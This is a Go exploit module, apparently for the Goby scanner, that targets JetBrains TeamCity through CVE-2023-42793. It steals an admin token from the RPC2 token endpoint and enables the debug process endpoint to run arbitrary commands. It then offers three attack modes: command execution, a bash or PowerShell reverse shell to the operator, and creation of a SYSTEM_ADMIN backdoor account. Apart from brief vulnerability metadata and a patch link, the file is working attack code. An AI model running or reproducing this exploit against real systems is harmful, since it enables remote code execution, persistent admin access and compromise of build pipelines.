package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "JetBrains TeamCity remote command execution vulnerability (CVE-2023-42793)",
    "Description": "<p>JetBrains TeamCity is a general CI/CD software platform developed by JetBrains.</p><p>JetBrains TeamCity can obtain the valid token of the corresponding id user by accessing the /app/rest/users/{{id}}/tokens/RPC2 endpoint. Accessing the restricted endpoint with the admin token will cause remote command execution or the creation of a background administrator user.</p>",
    "Product": "JET_BRAINS-TeamCity",
    "Homepage": "https://www.jetbrains.com/teamcity/",
    "DisclosureDate": "2023-09-19",
    "PostTime": "2023-10-13",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "header=\"Teamcity\" || banner=\"Teamcity\" || title=\"TeamCity\" || body=\"content=\\\"TeamCity (Log in to TeamCity\"",
    "GobyQuery": "header=\"Teamcity\" || banner=\"Teamcity\" || title=\"TeamCity\" || body=\"content=\\\"TeamCity (Log in to TeamCity\"",
    "Level": "3",
    "Impact": "<p>JetBrains TeamCity can obtain the valid token of the corresponding id user by accessing the /app/rest/users/{{id}}/tokens/RPC2 endpoint. Accessing the restricted endpoint with the admin token will cause remote command execution or the creation of a background administrator user.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/\">https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/</a></p>",
    "References": [
        "https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,createUser",
            "show": ""
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "username",
            "type": "input",
            "value": "xxx",
            "show": "attackType=createUser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "xxx",
            "show": "attackType=createUser"
        },
        {
            "name": "email",
            "type": "input",
            "value": "xxx@local",
            "show": "attackType=createUser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Permission Bypass"
    ],
    "VulType": [
        "Command Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-42793"
    ],
    "CNNVD": [
        "CNNVD-202309-1891"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "JetBrains TeamCity 远程命令执行漏洞（CVE-2023-42793）",
            "Product": "JET_BRAINS-TeamCity",
            "Description": "<p>JetBrains TeamCity 是 JetBrains 公司开发的一款通用 CI/CD 软件平台。</p><p>JetBrains TeamCity 可通过访问 /app/rest/users/{{id}}/tokens/RPC2 端点获取对应 id 用户的有效 token，携带 admin token 访问受限端点导致远程命令执行或创建后台管理员用户。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/\">https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/</a></p>",
            "Impact": "<p>JetBrains TeamCity 可通过访问 /app/rest/users/{{id}}/tokens/RPC2 端点获取对应 id 用户的有效 token，携带 admin token 访问受限端点导致远程命令执行或创建后台管理员用户。<br></p>",
            "VulType": [
                "权限绕过",
                "命令执行"
            ],
            "Tags": [
                "权限绕过",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "JetBrains TeamCity remote command execution vulnerability (CVE-2023-42793)",
            "Product": "JET_BRAINS-TeamCity",
            "Description": "<p>JetBrains TeamCity is a general CI/CD software platform developed by JetBrains.</p><p>JetBrains TeamCity can obtain the valid token of the corresponding id user by accessing the /app/rest/users/{{id}}/tokens/RPC2 endpoint. Accessing the restricted endpoint with the admin token will cause remote command execution or the creation of a background administrator user.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/\">https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/</a></p>",
            "Impact": "<p>JetBrains TeamCity can obtain the valid token of the corresponding id user by accessing the /app/rest/users/{{id}}/tokens/RPC2 endpoint. Accessing the restricted endpoint with the admin token will cause remote command execution or the creation of a background administrator user.<br></p>",
            "VulType": [
                "Command Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Command Execution",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10848"
}`

	deleteToken4f2e5a93 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfgDelete := httpclient.NewGetRequestConfig("/app/rest/users/id:1/tokens/RPC2")
		cfgDelete.Method = "DELETE"
		cfgDelete.VerifyTls = false
		cfgDelete.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgDelete)
	}

	getToken1b57903d := func(hostInfo *httpclient.FixUrl) string {
		// 移除该用户之前的 token，避免冲突
		deleteToken4f2e5a93(hostInfo)
		cfgGetToken := httpclient.NewPostRequestConfig("/app/rest/users/id:1/tokens/RPC2")
		cfgGetToken.VerifyTls = false
		cfgGetToken.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, cfgGetToken)
		if err != nil || !strings.Contains(rsp.Utf8Html, "token name=\"RPC2\"") {
			return ""
		}
		return rsp.Utf8Html[strings.Index(rsp.Utf8Html, "value=\"")+len("value=\"") : strings.Index(rsp.Utf8Html, "\"/>")]
	}

	sendPayloadCmdExece124df14 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		token := getToken1b57903d(hostInfo)
		if token == "" {
			return nil, errors.New("漏洞利用失败")
		}
		defer deleteToken4f2e5a93(hostInfo)
		cfgEnableDebug := httpclient.NewPostRequestConfig("/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true")
		cfgEnableDebug.VerifyTls = false
		cfgEnableDebug.FollowRedirect = false
		cfgEnableDebug.Header.Store("Authorization", "Bearer "+token)
		_, err := httpclient.DoHttpRequest(hostInfo, cfgEnableDebug)
		if err != nil {
			return nil, err
		}
		execEndpoint := "/app/rest/debug/processes"
		for offset, command := range strings.Split(cmd, " ") {
			if offset == 0 {
				execEndpoint += "?exePath=" + command
			} else {
				execEndpoint += "&params=" + command
			}
		}
		cfgExec := httpclient.NewPostRequestConfig(execEndpoint)
		cfgExec.VerifyTls = false
		cfgExec.FollowRedirect = false
		cfgExec.Header.Store("Authorization", "Bearer "+token)
		return httpclient.DoHttpRequest(hostInfo, cfgExec)
	}

	sendPayloadNewAdminAccount2b6a36c1 := func(hostInfo *httpclient.FixUrl, username, password, email string) (*httpclient.HttpResponse, error) {
		token := getToken1b57903d(hostInfo)
		if token == "" {
			return nil, errors.New("漏洞利用失败")
		}
		defer deleteToken4f2e5a93(hostInfo)
		cfgNewAdmin := httpclient.NewPostRequestConfig("/app/rest/users")
		cfgNewAdmin.VerifyTls = false
		cfgNewAdmin.FollowRedirect = false
		cfgNewAdmin.Header.Store("Content-Type", "application/json")
		cfgNewAdmin.Header.Store("Authorization", "Bearer "+token)
		cfgNewAdmin.Data = "{\"username\": \"" + username + "\", \"password\": \"" + password + "\", \"email\": \"" + email + "\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
		return httpclient.DoHttpRequest(hostInfo, cfgNewAdmin)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, _ := sendPayloadCmdExece124df14(u, "echo "+checkStr)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			reverse := goutils.B2S(ss.Params["reverse"])
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType == "cmd" {
				rsp, err := sendPayloadCmdExece124df14(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, "StdOut:") && strings.Contains(rsp.Utf8Html, "StdErr:") {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "StdOut:")+len("StdOut:") : strings.Index(rsp.Utf8Html, "StdErr:")]
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				// 默认为 linux
				cmd = "bash -c " + url.QueryEscape(godclient.ReverseTCPByBash(rp))
				if reverse == "windows" {
					cmd = godclient.ReverseTCPByPowershell(rp)
				}
				go sendPayloadCmdExece124df14(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "createUser" {
				username := goutils.B2S(ss.Params["username"])
				password := goutils.B2S(ss.Params["password"])
				email := goutils.B2S(ss.Params["email"])
				rsp, err := sendPayloadNewAdminAccount2b6a36c1(expResult.HostInfo, username, password, email)
				if err != nil {
					expResult.Output = err.Error()
				} else if rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, username) && strings.Contains(rsp.Utf8Html, email) {
					expResult.Success = true
					expResult.Output = strings.Join([]string{"email: " + email, "username: " + username, "password: " + password}, "\n")
				} else {
					expResult.Output = "漏洞利用失败，请检查服务器状态或用户名重复"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
